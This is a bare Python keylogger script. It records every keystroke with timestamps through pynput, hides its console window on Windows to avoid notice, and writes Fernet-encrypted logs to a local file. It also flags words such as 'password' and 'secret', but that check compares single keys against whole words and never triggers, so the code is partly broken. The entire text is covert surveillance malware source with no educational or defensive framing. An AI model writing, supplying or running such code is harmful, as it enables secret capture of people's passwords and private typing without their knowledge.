import os
import time
from pynput import keyboard
from cryptography.fernet import Fernet

LOG_FILE = "key_log.txt"
KEY_FILE = "encryption.key"
KEYWORDS = ["password", "flag", "secret"]

if not os.path.exists(KEY_FILE):
    ENCRYPTION_KEY = Fernet.generate_key()
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(ENCRYPTION_KEY)
else:
    with open(KEY_FILE, "rb") as key_file:
        ENCRYPTION_KEY = key_file.read()

fernet = Fernet(ENCRYPTION_KEY)

def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"

    log_entry = f"{timestamp} - {key_str}\n"

    for keyword in KEYWORDS:
        if keyword in key_str.lower():
            print(f"[ALERT] Keyword '{keyword}' detected at {timestamp}")

    encrypted_entry = fernet.encrypt(log_entry.encode())
    with open(LOG_FILE, "ab") as f:
        f.write(encrypted_entry + b"\n")

hide_console()
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
